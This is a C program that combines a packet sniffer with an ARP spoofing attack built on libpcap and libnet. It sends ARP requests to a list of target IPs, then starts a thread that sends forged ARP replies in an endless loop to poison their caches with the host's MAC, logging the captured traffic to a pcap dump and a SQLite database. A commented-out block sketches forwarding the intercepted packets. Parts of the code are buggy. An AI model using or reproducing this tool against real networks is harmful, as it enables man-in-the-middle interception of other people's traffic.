#include<stdio.h>
#include<stdlib.h>
#include<pcap/pcap.h>
#include<arpa/inet.h>
#include"ethernet.h"
#include<ctype.h>
#include<time.h>
#include<libnet.h>
#include<string.h>
#include<unistd.h>
#include<sqlite3.h>
#include<net/if.h>
#include<arpa/inet.h>
#include<pthread.h>
#define SIZE_ETHERNET 14
#define PACKETS_NUMBERS 20

#define ARP_REQUEST 1
#define ARP_REPLY   2

#define MAX_IP_NUM 100

void analyze_packets(u_char *args, const struct pcap_pkthdr *header,const u_char *packet);
void call_arp_spoof(const u_char* packet);
int  send_arp(u_int8_t* dst_ip_str,char* device);
void*  send_arp_reply(void*);
void insert_databases();
char errbuf[PCAP_ERRBUF_SIZE];
char* get_ip(char* device);//得到主机IP MAC
int get_mac(char* device,unsigned char src_mac[6]);
void string_to_arry(unsigned char temp[4],char ip[17]);

int send_packets();//用于数据包转发
char* ip_hostt;
struct ip_mac ip_form[MAX_IP_NUM];
int ip_num;
char* device;
pcap_t* handle=NULL;
unsigned char mac_host[6];
u_int8_t* ip_host;
int main()
{
    pcap_if_t*  alldevsp=NULL;
    ip_num=0;
    FILE* fp_ip=fopen("ip_form","r");
    FILE* fp=fopen("log","at+");//日志文件
    FILE* filter=fopen("filter","r");//过滤规则文件
    char filter_str[200];
    int ret=0;
    while(!feof(fp_ip))//将表格数据存入结构体数组以供使用 ip_num为ip地址数量
    {
        fgets(ip_form[ip_num].ip,17,fp_ip);
        if(ip_form[ip_num].ip[strlen(ip_form[ip_num].ip)-1]=='\n')
            ip_form[ip_num].ip[strlen(ip_form[ip_num].ip)-1]='\0';//去除表中\n字符
        ip_num++;
    }
    ip_num-=1;
    device=pcap_lookupdev(errbuf);//device是设备名，全局变量以供调用
    if(device)
    {
        fprintf(fp,"name is %s\n",device);
        printf("open device success %s\n",device);
    }
    else
    {
        fprintf(fp,"open device failure\n");
        exit(1);
    }
    //unsigned char mac_host[6];
    if(get_mac(device,mac_host)==0)
    {
        printf("host mac:%02x %02x %02x %02x %02x %02x\n",
               mac_host[0]&0xff,
               mac_host[1]&0xff,
               mac_host[2]&0xff,
               mac_host[3]&0xff,
               mac_host[4]&0xff,
               mac_host[5]&0xff);

    }
    else
    {
        fprintf(fp,"获得本机MAC地址时错误\n");
        printf("get_mac函数调用获得本机地址时错误\n");
    }
    ip_host=(u_int8_t*) get_ip(device);
    if(ip_host!=NULL)
    {
        printf("host ip %s\n",ip_host);
    }
    else
    {
        fprintf(fp,"获得主机IP地址时错误\n");
        printf("调用get_ip函数时出错，主机ip地址未获得\n");
        exit(1);
    }
    handle=pcap_open_live(device,65535,1,0,errbuf);
    if(handle)
    {
        fprintf(fp,"pcap_open_live success\n");
        printf("pcap_open_live success\n");
    }
    else
    {
        fprintf(fp,"调用pcap_open_live时出错\n");
        printf("open_live error%s\n",errbuf);
        exit(1);
    }
    pcap_dumper_t* dumpfp;
    dumpfp=pcap_dump_open(handle,"dump.pcap");//用于保存日志文件,内容为原始数据包
    if(dumpfp==NULL)
    {
        fprintf(fp,"No dump.pcap\n");
        exit(1);
    }
    bpf_u_int32 netp,maskp;
    char* net,*mask;
    struct in_addr addr;
    ret=pcap_lookupnet(device,&netp,&maskp,errbuf);
    if(!ret)
    {
        printf("call pcap_lookupnet success\n");
        fprintf(fp,"call pcap_lookupnet success\n");
    }
    else
    {
        printf("lookupnet error%s\n",errbuf);
        fprintf(fp,"call pcap_lookupnet failure\n");
        exit(1);
    }
    addr.s_addr=netp;
    net=inet_ntoa(addr);
    if(net==NULL)
    {
        printf("ip error\n");
        exit(0);
    }
    else
    {
        printf("ip %s\n",net);
    }
    addr.s_addr=maskp;
    mask=inet_ntoa(addr);
    if(mask==NULL)
    {
        printf("mask error\n");
        exit(0);
    }
    else
    {
        printf("mask is%s\n",mask);
    }
    if(fgets(filter_str,199,filter)==NULL)
    {
        fprintf(fp,"OPEN FILTER FAILURE\n");
        printf("OPEN FILTER FAILURE\n");
        exit(1);
    }
    struct bpf_program f;
    if(pcap_compile(handle,&f,filter_str,0,netp)==-1)
    {
        fprintf(fp,"COMPILE ERROE\n");
        printf("COMPILE ERROR\n");
        exit(1);
    }
    if(pcap_setfilter(handle,&f)==-1)//编译过滤规则，过滤规则写入filter配置文件
    {
        fprintf(fp,"SETFILTER ERROR\n");
        printf("SETFILTER ERROR\n");
        exit(1);
    }
    else
    {
        printf("Commpile success\n");
    }
    for(int i=0; i<ip_num; i++) //向ip表中的所有ip发送ARP请求包，目的获得他们的mac地址
    {
        u_int8_t* dst_ip_str = (u_int8_t*) ip_form[i].ip;
        send_arp(dst_ip_str,device);
    }
    pthread_t thread;//线程用于循环发送ARP应答包以达到欺骗目的，已实现。
    if(pthread_create(&thread,NULL,send_arp_reply,NULL)==-1)
    {
        printf("creat thread failure\n");
        fprintf(fp,"建立发送线程时失败\n");
        exit(1);
    }
    else
    {
        printf("creat thread success\n");
    }
    ret=pcap_loop(handle,PACKETS_NUMBERS,analyze_packets,(u_char *)dumpfp);
    if(ret==0)
    {
        printf("pcap_loop success\n");
    }
    else
    {
        fprintf(fp,"pcap_loop failure\n");
        printf("pcap_loop failure\n");
        exit(1);
    }
    pthread_cancel(thread);//取消线程，在线程执行路径上有pthread_testcancel;
    pcap_dump_close(dumpfp);
    pcap_freealldevs(alldevsp);
    fclose(fp);
    fclose(filter);
    fclose(fp_ip);
    printf("CODE OVER\n");
    return 0;
}

void analyze_packets(u_char *args, const struct pcap_pkthdr *header,const u_char *packet)
{
    struct mac_header *ethernet=NULL;
    struct arp_header *arp=NULL;
    static unsigned int tcp_num=0,icmp_num=0,udp_num=0i,igmp_num=0;//个数据包捕获的数量
    unsigned int paclen = header->len;//解析出包长度
    unsigned int pacaplen=header->caplen;//解析出包实际长度
    char* strtime=ctime((const time_t*)&header->ts.tv_sec);//捕获时间
    static unsigned int count=0;
    static double packet_count=0;//每秒数据包数量
    static unsigned int packets_len=0;//总流量
    static unsigned int tick_count=0;//时间起点
    static double speed=0.0;//流量传输速度
    unsigned char* payload=NULL;
    sqlite3* db;
    char* sql;
    int ret;
    packets_len+=header->len;
    ret = sqlite3_open("packet.db",&db);
    if(ret)
    {
        printf("打开数据库出错\n");
        exit(1);
    }
    packet_count++;
    printf("*****************************************************************************************\n");
    pcap_dump(args,header,packet);
    ethernet = (struct mac_header*)(packet);
    printf("捕获接口Interface Id:     :%s\n",device);
    //  printf("封装类型Encapsulation type:ethernet(1)\n");
    printf("捕获时间Arrival time      :%s",strtime);
    printf("目的mac地址Destination    :%02x %02x %02x %02x %02x %02x\n",
           ethernet->mac_dhost[0],
           ethernet->mac_dhost[1],
           ethernet->mac_dhost[2],
           ethernet->mac_dhost[3],
           ethernet->mac_dhost[4],
           ethernet->mac_dhost[5]);
    printf("源mac地址Source           :%02x %02x %02x %02x %02x %02x\n",
           ethernet->mac_shost[0],
           ethernet->mac_shost[1],
           ethernet->mac_shost[2],
           ethernet->mac_shost[3],
           ethernet->mac_shost[4],
           ethernet->mac_shost[5]);
    switch(ntohs(ethernet->mac_type)){
    case 0x0800:
        printf("IPV4 PACKET(0x800)\n");
        break;
    case 0x86DD:
        printf("IPV6 Packet(0x86DD)\n");
        break;
    case 0x0806:
        printf("ARP PACKET(0x0806)\n");
        break;
    case 0x8035:
        printf("RARP PACKET(0x8035)\n");
        break;
    case 0x809B:
        printf("EtherTalk PACKET(0x809B)\n");
        break;
    case 0x880B:
        printf("PPP PACKET(0x880B)\n");
        break;
    case 0x8863:
        printf("PPPoE Discovery Stage(0x8864)\n");
        break;
    case 0x8864:
        printf("PPPoE Session Stage(0x8864)\n");
        break;
    case 0x814C:
        printf("SNMP PACKET(0x814C)\n");
        break;
    }//暂时先显示这些数据包

    if(ntohs(ethernet->mac_type)==0x0800)//IPv4数据包，应当能提供转发操作
    {
        struct ip_header  *ip=NULL;
        ip=(struct ip_header*)(packet+14);//以太网帧长度14
	printf("版本Version              :%d\n",(ip->ip_vhl>>4));
	printf("首部长度Header Length    :%dbytes(%d)\n",IP_HL(ip)*4,IP_HL(ip));
	printf("差分服务                 :0x%02x\n",ntohs(ip->ip_tos)>>8);
	printf("总长度Total Length       :%d \n",ntohs(ip->ip_len));
	printf("标识Identification       :%02x(%d)\n",ntohs(ip->ip_id),ntohs(ip->ip_id));
        if(ip->ip_off&IP_RF)
	{
		printf("标志Flags    :保留位Reserved bit\n");
	}
	else if(ip->ip_off&IP_DF)
	{
		printf("标志Flag     :不分片Don't fragment\n");
	}
	else if(ip->ip_off&IP_MF)
	{
		printf("标志Flags    :更多分片More fragments\n");
	}
	printf("片偏移Fragment offset:0x%02x|0x1fff\n",ntohs(ip->ip_off));
	printf("生存时间Time of live :%d\n",ip->ip_ttl);
	printf("协议类型Protocol :");
	switch(ip->ip_p){
        case IPPROTO_TCP:
            printf("TCP 协议\n");
            tcp_num++;
            break;
        case IPPROTO_UDP:
            printf("UDP 协议\n");
            udp_num++;
            break;
        case IPPROTO_ICMP:
            printf("ICMP 协议\n");
            icmp_num++;
	    break;
	case IPPROTO_IGMP:
	    printf("IGMP 协议\n");
	    igmp_num++;
	    break;
        }//此处应当将TCP UDP ICMP分离//此处先仅仅分离tcp
	printf("首部校验和  :0x%02x\n",ntohs(ip->ip_sum));
        printf("源IP地址   ：%s\n",inet_ntoa(ip->ip_src));
        printf("目的IP地址 ：%s\n",inet_ntoa(ip->ip_dst));
        if(ip->ip_p==IPPROTO_TCP)//tcp数据包
        {
            struct tcp_header *tcp=NULL;
            tcp=(struct tcp_header*)(packet+14+IP_HL(ip)*4);
	    printf("源端口SourcePort       :%d\n",ntohs(tcp->th_sport));
	    printf("目的端口DestinationPort:%d\n",ntohs(tcp->th_dport));
	    printf("序号Sequence number    :%d\n",ntohs(tcp->th_seq));
	    printf("确认号Acknowledgment number:%d\n",ntohs(tcp->th_ack));
	    printf("头部长度HeaderLength   :%dbytes(%d)\n",TH_OFF(tcp)*4,TH_OFF(tcp));
	    if(TH_FIN&tcp->th_flags)
		    printf("FIN\n");
	    else if(TH_SYN&tcp->th_flags)
		    printf("SYN\n");
	    else if(TH_RST&tcp->th_flags)
		    printf("REST\n");
	    else if(TH_PUSH&tcp->th_flags)
		    printf("PUSH\n");
	    else if(TH_ACK&tcp->th_flags)
		    printf("ACKNOWLEDGMENT\n");
	    else if(TH_URG&tcp->th_flags)
		    printf("URGENT\n");
	    else if(TH_ECE&tcp->th_flags)
		    printf("ECN-Echo\n");
	    else if(TH_CWR&tcp->th_flags)
		    printf("CWR\n");
	    else if(TH_FLAGS)
		    printf("Nonce\n");
	    printf("窗口大小Windowssizevalue:%d\n",ntohs(tcp->th_win));
	    printf("校验和ChwckSum          :%d\n",ntohs(tcp->th_sum));
	    printf("紧急指针Uegment pointer :%d\n",ntohs(tcp->th_urp));
            unsigned int size_tcp=TH_OFF(tcp)*4;
            payload=(u_char*)(packet+14+20+size_tcp);
	    if(payload!=NULL);//tcp的选项字段 //数据库重新设计
    	    sql = sqlite3_mprintf("INSERT INTO PAC VALUES(%d,%d,%d,'%s',%d,%d,'%s','%s',%d)",
  			    count,
                            header->len,
			    header->caplen,
			    strtime,
			    ntohs(tcp->th_sport),
			    ntohs(tcp->th_dport),
			    inet_ntoa(ip->ip_src),
			    inet_ntoa(ip->ip_dst),
			    ip->ip_p);
    	    ret = sqlite3_exec(db,sql,NULL,NULL,NULL);
	    if(ret != SQLITE_OK)
    	    {
	    	    fprintf(stderr, "SQL error: %s\n",errbuf);
            	    sqlite3_free(errbuf);
                    exit(1);
            }
        }
        if(ip->ip_p==IPPROTO_UDP)
        {
	    struct udp_header* udp=NULL;
            udp=(struct udp_header*)(packet+14+IP_HL(ip)*4);
	    printf("源端口");
        }
        if(ip->ip_p==IPPROTO_ICMP)
        {
        }
	if(ip->ip_p==IPPROTO_IGMP)
	{
	}
	/*
	if((strcmp(inet_ntoa(ip->ip_dst),"192.168.1.28")!=0)&&(ethernet->mac_dhost[0]!=0xdc))//尝试转发数据包	目的ip与目的mac不一致时发送
        {
            printf("目的IP地址与本机IP地址不相等\n");
            for(int i=0; i<ip_num; i++)
            {
                if(strcmp(ip_form[i].ip,inet_ntoa(ip->ip_dst))==0)
                {
                    printf("ip_form表中IP地址%s",ip_form[i].ip);
                    for(int j=0; j<6; j++)
                    {
                        ethernet->mac_dhost[j]=ip_form[i].mac[j];
                        printf("ip_form");****************************
                    }
                    if(pcap_inject(handle,packet,header->len)==PCAP_ERROR)
                    {
                        printf("send packet error\n");
                    }
                    break;
                }
        `    }
        }
        printf("转发数据包结束\n");*/
    }
    if(ntohs(ethernet->mac_type)==0x0806)
    {
        arp=(struct arp_header*)(packet+14);
        printf("操作代码%d\n",ntohs(arp->opcode));
        (ntohs(arp->opcode)==2)?printf("REPLY\n"):printf("REQUEST\n");
        printf("发送者硬件地址\n:%02x %02x %02x %02x %02x %02x\n",
               arp->mac_shost[0],
               arp->mac_shost[1],
               arp->mac_shost[2],
               arp->mac_shost[3],
               arp->mac_shost[4],
               arp->mac_shost[5]);
        printf("目标硬件地址  \n:%02x %02x %02x %02x %02x %02x\n",
               arp->mac_dhost[0],
               arp->mac_dhost[1],
               arp->mac_dhost[2],
               arp->mac_dhost[3],
               arp->mac_dhost[4],
               arp->mac_dhost[5]);
        printf("发送者IP地址 ：%d.%d.%d.%d\n",
               arp->ip_src[0],
               arp->ip_src[1],
               arp->ip_src[2],
               arp->ip_src[3]
              );
        printf("目的IP地址   ：%d.%d.%d.%d\n",
               arp->ip_dst[0],
               arp->ip_dst[1],
               arp->ip_dst[2],
               arp->ip_dst[3]
              );
        printf("比较\n");
        for(int i=0; i<ip_num; i++)
        {
            unsigned char temp[4];
            string_to_arry(temp,ip_form[i].ip);
            if(arp->ip_src[0]==temp[0]&&arp->ip_src[1]==temp[1]&&temp[2]==arp->ip_src[2]&&temp[3]==arp->ip_src[3])
            {
                for(int j=0; j<6; j++)
                {
                    ip_form[i].mac[j]=arp->mac_shost[j];
                    printf("ip_form[%d].mac[%d]:%02x ",i,j,ip_form[i].mac[j]);
                }
                printf("\ncopy success\n");
            }
        }
        printf("比较失败\n");
    }
    if(ntohs(ethernet->mac_type)==0x0835)//RARP
    {

    }
    const u_char *ch=(u_char*)packet;
    const u_char *ch2=(u_char*)packet;
    for(unsigned int i=0; i<header->len-1; i+=16) //将所有数据打印
    {
        for(unsigned int j=0; j<16; j++)
        {
            printf("%02x ",*ch);
            if(i+j>header->len-2)
            {
                for(; j<16; j++)
                    printf("   ");
                ch=NULL;
                break;
            }
            ch++;
        }
        printf("\t");
        for(unsigned int j=0; j<16; j++)
        {
            if(isprint(*ch2))
                printf("%c",*ch2);
            else
                printf(".");
            if((i+j)>header->len-2)
            {
                ch2=NULL;
                break;
            }
            ch2++;
        }
        printf("\n");
    }


    count++;
    sqlite3_close(db);
    printf("\n");
}

char* get_ip(char* device)
{
    int sockfd;
    struct sockaddr_in sin;
    struct ifreq ifr;
    sockfd=socket(AF_INET,SOCK_DGRAM,0);
    if(sockfd==-1)
    {
        printf("get ip error\n");
        return NULL;
    }
    strncpy(ifr.ifr_name,device, IFNAMSIZ);      //Interface name
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == 0)      //SIOCGIFADDR 获取interface address
    {
        memcpy(&sin, &ifr.ifr_addr, sizeof(ifr.ifr_addr));
        return inet_ntoa(sin.sin_addr);
    }
    return NULL;
}

int get_mac(char* device,unsigned char src_mac[6])
{
    int sockfd;
    struct ifreq ifr;
    sockfd=socket(AF_INET,SOCK_DGRAM,0);
    if(sockfd==-1)
    {
        printf("get mac error\n");
        exit(-1);
    }
    strncpy(ifr.ifr_name,device,IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == 0)
    {
        memcpy(src_mac, ifr.ifr_hwaddr.sa_data, 6);
    }
    return 0;
}


int send_arp(u_int8_t* dst_ip_str,char* device)
{
    libnet_t *handle;
    int packet_size;
    u_int8_t* src_ip_str=(u_int8_t*) get_ip(device);//源IP 本机的IP
    u_int8_t dst_mac[6]= {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}; //广播地址 目的MAC
    u_int8_t rev_mac[6]= {0x00,0x00,0x00,0x00,0x00,0x00};
    u_int32_t  dst_ip,src_ip;
    libnet_ptag_t arp_proto_tag, eth_proto_tag;
    if ( (handle = libnet_init(LIBNET_LINK_ADV, device, errbuf)) == NULL )
    {
        printf("libnet_init: error [%s]\n", errbuf);
        return -1;
    }
    unsigned char src_mac[6];
    get_mac(device,src_mac);
    printf("调用send_arp函数，其中主机的IP地址为%s,主机的mac地址为%s,目的IP地址为%s\n",src_ip_str,src_mac,dst_ip_str);
    dst_ip = libnet_name2addr4(handle,(char*)dst_ip_str, LIBNET_RESOLVE);
    src_ip = libnet_name2addr4(handle,(char*)src_ip_str, LIBNET_RESOLVE);
    if ( dst_ip == -1 || src_ip == -1 )
    {
        printf("send_arp ip address convert error\n");
        return -1;
    }
    arp_proto_tag = libnet_build_arp(
                        ARPHRD_ETHER,        /* 硬件类型,1表示以太网硬件地址 */
                        ETHERTYPE_IP,        /* 0x0800表示询问IP地址 */
                        6,                   /* 硬件地址长度 */
                        4,                   /* IP地址长度 */
                        ARPOP_REQUEST,       /* 操作方式:ARP请求 */
                        (u_int8_t *)src_mac,             /* source MAC addr */
                        (u_int8_t *)&src_ip, /* src proto addr */
                        (u_int8_t *)rev_mac,             /* dst MAC addr */
                        (u_int8_t *)&dst_ip, /* dst IP addr */
                        NULL,                /* no payload */
                        0,                   /* payload length */
                        handle,              /* libnet tag */
                        0                    /* Create new one */
                    );
    if (arp_proto_tag == -1)
    {
        printf("build IP failure\n");
        return -1;
    }
    eth_proto_tag = libnet_build_ethernet(
                        (u_int8_t *)dst_mac,         /* 以太网目的地址 */
                        (u_int8_t *)src_mac,         /* 以太网源地址 */
                        ETHERTYPE_ARP,   /* 以太网上层协议类型，此时为ARP请求 */
                        NULL,            /* 负载，这里为空 */
                        0,               /* 负载大小 */
                        handle,          /* Libnet句柄 */
                        0                /* 协议块标记，0表示构造一个新的 */
                    );
    if (eth_proto_tag == -1)
    {
        printf("build eth_header failure\n");
        return -1;
    }
    packet_size = libnet_write(handle);    /* 发送已经构造的数据包*/
    if(packet_size);
    libnet_destroy(handle);                /* 释放句柄 */
    return 0;
}

void*  send_arp_reply(void* a)
{
    while(1)
    {
        printf("调用sendreply函数\n");
        sleep(1);
        libnet_t* handle;
        int packet_size;
        for(int src=0; src<ip_num; src++) //对IP表中的某一IP地址发送其他地址的arp欺骗包
        {
            for(int dst=0; dst<ip_num; dst++)
            {
                if(ip_form[dst].mac==NULL&&(
                            ip_form[src].ip[0]!=ip_form[dst].ip[0]&&
                            ip_form[src].ip[1]!=ip_form[dst].ip[1]&&
                            ip_form[src].ip[2]!=ip_form[dst].ip[2]&&
                            ip_form[src].ip[3]!=ip_form[dst].ip[3]))//ip表中对应的IP的MAC地址不为空且不是本身
                    continue;
                unsigned char src_mac[6];//攻击者MAC地址
                get_mac(device,src_mac);
                u_int32_t dst_ip,src_ip;
                libnet_ptag_t arp_proto_tag,eth_proto_tag;
                if((handle=libnet_init(LIBNET_LINK_ADV,device,errbuf))==NULL)
                {
                    printf("libnet_init:errbuf %s\n",errbuf);
                    exit(-1);
                }
                src_ip=libnet_name2addr4(handle,ip_form[0].ip,LIBNET_RESOLVE);
                dst_ip=libnet_name2addr4(handle,ip_form[dst].ip,LIBNET_RESOLVE);
                printf("显示的当前的IP地址%s\n本机MAC为：%s\n%02x %d %02x\n",ip_form[dst].ip,ip_form[dst].ip,src_mac[0]&0xff,src_mac[1],src_mac[2]);
                if(dst_ip==-1||src_ip==-1)
                    printf("ip address convert error\n");
                arp_proto_tag=libnet_build_arp(
                                  ARPHRD_ETHER,
                                  ETHERTYPE_IP,
                                  6,
                                  4,
                                  ARPOP_REPLY,
                                  (u_int8_t *)src_mac,
                                  (u_int8_t *)&src_ip,
                                  (u_int8_t *)ip_form[dst].mac,
                                  (u_int8_t *)&dst_ip,
                                  NULL,
                                  0,
                                  handle,
                                  0);
                if(arp_proto_tag==-1)
                {
                    printf("build IP failure\n");
                    exit(-1);
                }
                eth_proto_tag=libnet_build_ethernet(
                                  (u_int8_t*)ip_form[dst].mac,
                                  (u_int8_t*)src_mac,
                                  ETHERTYPE_ARP,
                                  NULL,
                                  0,
                                  handle,
                                  0
                              );
                if(eth_proto_tag==-1)
                {
                    printf("build eth_header failure\n");
                    exit(-1);
                }
                packet_size=libnet_write(handle);
                if(packet_size);
                libnet_destroy(handle);
                pthread_testcancel();
            }
        }
    }
}

void string_to_arry(unsigned char temp[4],char ip[17])//本函数目的将字符串的IP地址转化成用大小为4数组存储
{
    long int len=strlen(ip);
    int j=1;
    int sum=0;
    int k=3;
    for(int i=len-1; i>=-1; i--)
    {
        if(ip[i]=='.'||i==-1)
        {
            temp[k--]=sum;
            sum=0;
            j=1;
            continue;
        }
        sum=sum+(ip[i]-'0')*j;
        j*=10;
    }
}



